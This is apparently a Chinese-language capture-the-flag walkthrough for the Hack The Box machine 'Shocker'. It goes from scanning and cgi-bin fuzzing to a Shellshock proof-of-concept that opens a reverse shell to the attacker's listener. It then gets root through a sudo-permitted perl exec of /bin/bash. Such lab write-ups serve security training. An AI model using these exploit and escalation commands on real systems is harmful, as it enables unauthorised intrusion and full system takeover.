# shocker

## 信息收集

```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-23 02:50 CDT
Nmap scan report for 10.10.10.56
Host is up (0.43s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
53/tcp   filtered domain
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.17 seconds
```

看一下80端的网页。

![image](../../%E5%9B%BE%E5%BA%8A/Firefox_Screenshot_2022-08-23T07-59-24.881Z.png)

F12也没找到什么内容，这个图片的路径是ip/bug.jpg。

dirsearch有看到一个`/cgi-bin/` 这个一开始没能引起注意，实际上这个路径存在shellshock的入口点。

但如何获取目标`/cgi-bin/user.sh`其实有点碰墙，目前看下来只能跟着官方思路，用dirbuster、gobuster或者其它暴力fuzz的工具，fuzz后缀名为`cgi​, sh​, ​pl​, ​py...`的文件，字典可以用seclists的`Discovery/Web-Content/raft-medium-directories.txt`。

后续的利用有多种方式，考虑OSCP不推荐使用msf的情况，这里选择[PoC脚本](https://exploit-db.com/exploits/34900/)。另外还有一种是[使用nmap的shellshock脚本，以burp监听并修改payload，使用nc反连](https://icode.best/i/75710940057028)。

```
python2 CVE-2014-6271_cgi-bin_revshell.py payload=reverse rhost=10.10.10.56 lhost=10.10.16.2 lport=1337 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> 
10.10.10.56> cd root
/bin/bash: line 10: cd: root: Permission denied

10.10.10.56> cd home
10.10.10.56> ls
shelly

10.10.10.56> cd shelly
10.10.10.56> ls
user.txt
```

这里shell可以直接拿user flag，但是想拿root flag要提权。

检测可以提取的命令，官方WP给的是[这个](https://github.com/rebootuser/LinEnum)

在尝试寻找其它可能的方式时，顺便找到了[一位我关注的HTB工作人员写的针对靶机更详细的分析和WP](https://0xdf.gitlab.io/2021/05/25/htb-shocker.html)。本文WP也会针对他的一些操作进行改进。

这里我准备手动`sudo -l`看一下

```
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

找到可以使用perl后，寻找是否可以用perl提取。

```
10.10.10.56> sudo /usr/bin/perl -h

Usage: /usr/bin/perl [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F)
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit <> files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing 
10.10.10.56> sudo /usr/bin/perl -e 'exec"/bin/bash"'
program
  -n                assume "while (<>) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, patchlevel and license
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings
  -W                enable all warnings
  -x[directory]     ignore text before #!perl line (optionally cd to directory)
  -X                disable all warnings
  
Run 'perldoc perl' for more help with Perl.


10.10.10.56> sudo perl -e 'exec "/bin/bash"'
10.10.10.56> whoami
root
```



